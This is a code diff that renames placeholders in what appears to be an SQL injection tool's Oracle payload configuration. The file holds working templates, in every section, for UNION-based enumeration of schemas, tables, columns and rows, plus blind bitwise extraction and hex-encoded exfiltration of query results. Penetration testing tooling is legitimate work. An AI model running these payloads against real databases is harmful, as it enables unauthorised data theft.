@@ -3,11 +3,11 @@ resource:
  info: |
   SELECT 
       version
-      || '${ENCLOSE_VALUE_SQL}' 
+      || '${enclose_value_sql}' 
       || SYS.DATABASE_NAME 
-      || '${ENCLOSE_VALUE_SQL}' 
+      || '${enclose_value_sql}' 
       || user 
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
   FROM v%24instance
   
  schema: 
@@ -22,17 +22,17 @@ resource:
                                XmlElement(
                                    "a",
                                    rawtohex(
-                                       '${ENCLOSE_VALUE_SQL}'
+                                       '${enclose_value_sql}'
                                        || s
-                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
                                    )
                                ) order by s nulls last
                            ).getClobVal(),
                            '<a>',''
                        ),
                        '<%2Fa>',
-                       rawtohex('${SEPARATOR_CELL_SQL}')
-                   ) || rawtohex('${TRAIL_SQL}'),
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
                    4000,
                    1
                ) AS VARCHAR(1024)
@@ -45,7 +45,7 @@ resource:
            (SELECT DISTINCT owner s FROM all_tables) t1
        where t.s >= t1.s
        group by t.s
-       {limit}
+       ${limit}
    )
    
   table: |
@@ -59,9 +59,9 @@ resource:
                                XmlElement(
                                    "a",
                                    rawtohex(
-                                       '${ENCLOSE_VALUE_SQL}'
+                                       '${enclose_value_sql}'
                                        || s
-                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
                                    )
                                ) order by s nulls last
                            ).getClobVal(),
@@ -69,8 +69,8 @@ resource:
                            ''
                        ),
                        '<%2Fa>',
-                       rawtohex('${SEPARATOR_CELL_SQL}')
-                   ) || rawtohex('${TRAIL_SQL}'),
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
                    4000,
                    1
                ) AS VARCHAR(1024)
@@ -79,11 +79,11 @@ resource:
    from (
        select t.s 
        from 
-           (SELECT DISTINCT table_name s FROM all_tables where owner = '${DATABASE}') t,
-           (SELECT DISTINCT table_name s FROM all_tables where owner = '${DATABASE}') t1
+           (SELECT DISTINCT table_name s FROM all_tables where owner = '${database}') t,
+           (SELECT DISTINCT table_name s FROM all_tables where owner = '${database}') t1
        where t.s >= t1.s
        group by t.s
-       {limit}
+       ${limit}
    )
    
   column: |
@@ -97,9 +97,9 @@ resource:
                                XmlElement(
                                    "a",
                                    rawtohex(
-                                       '${ENCLOSE_VALUE_SQL}'
+                                       '${enclose_value_sql}'
                                        || s
-                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                       || '${separator_qte_sql}0${enclose_value_sql}'
                                    )
                                ) order by s nulls last
                            ).getClobVal(),
@@ -107,8 +107,8 @@ resource:
                            ''
                        ),
                        '<%2Fa>',
-                       rawtohex('${SEPARATOR_CELL_SQL}')
-                   ) || rawtohex('${TRAIL_SQL}'),
+                       rawtohex('${separator_cell_sql}')
+                   ) || rawtohex('${trail_sql}'),
                    4000,
                    1
                ) AS VARCHAR(1024)
@@ -117,11 +117,11 @@ resource:
    from (
        select t.s 
        from
-           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${DATABASE}' and table_name = '${TABLE}') t,
-           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${DATABASE}' and table_name = '${TABLE}') t1
+           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${database}' and table_name = '${table}') t,
+           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${database}' and table_name = '${table}') t1
        where t.s >= t1.s
        group by t.s
-       {limit}
+       ${limit}
    )
    
   row: 
@@ -136,9 +136,9 @@ resource:
                                 XmlElement(
                                     "a",
                                     rawtohex(
-                                        '${ENCLOSE_VALUE_SQL}'
+                                        '${enclose_value_sql}'
                                         || s
-                                        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                        || '${separator_qte_sql}0${enclose_value_sql}'
                                     )
                                 ) order by s nulls last
                             ).getClobVal(),
@@ -146,8 +146,8 @@ resource:
                             ''
                         ),
                         '<%2Fa>',
-                        rawtohex('${SEPARATOR_CELL_SQL}')
-                    ) || rawtohex('${TRAIL_SQL}'),
+                        rawtohex('${separator_cell_sql}')
+                    ) || rawtohex('${trail_sql}'),
                     4000,
                     1
                 ) AS VARCHAR(1024)
@@ -156,14 +156,14 @@ resource:
     from (
         select t.s 
         from 
-            (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE}) t,
-            (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE}) t1 
+            (SELECT DISTINCT ${fields} s FROM ${database}.${table}) t,
+            (SELECT DISTINCT ${fields} s FROM ${database}.${table}) t1 
         where t.s >= t1.s
         group by t.s
-        {limit}
+        ${limit}
     )
    fields: 
-    field: trim(to_char(${FIELD}))
+    field: trim(to_char(${field}))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -171,20 +171,20 @@ strategy:
   slidingWindow: |
    (
        select
-           '${LEAD}'
+           '${lead}'
            || substr(
-               (${INJECTION}),
-               ${INDEX},
-               ${CAPACITY}
+               (${injection}),
+               ${index},
+               ${capacity}
            ) from dual
    )
-  limit: having count(*) between ${LIMIT} and 65536
-  failsafe: to_char(1337${INDICE}7330%2b1)
+  limit: having count(*) between ${limit.value} and 65536
+  failsafe: to_char(1337${indice}7330%2b1)
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    ) s
   limitBoundary: 1
   endingComment: --+-
@@ -197,13 +197,13 @@ strategy:
     - Unclosed quotation mark after the character string '
     
  normal: 
-  indices: union select ${INDICES} from dual
+  indices: union select ${indices} from dual
   capacity: |
    (
        SELECT 
-           '${LEAD}' 
-           || ${INDICE} 
-           || ${CALIBRATOR} 
+           '${lead}' 
+           || ${indice} 
+           || ${calibrator} 
        FROM dual
    )
   orderBy: order by 1337
@@ -229,14 +229,14 @@ strategy:
     0 != BITAND(
         ascii(
             substr(
-                ${INJECTION}, 
-                ${INDEX}, 
+                ${injection}, 
+                ${index}, 
                 1
             )
         ), 
-        ${BIT}
+        ${bit}
     )
-   length: length(${INJECTION}) > ${INDEX}
+   length: length(${injection}) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
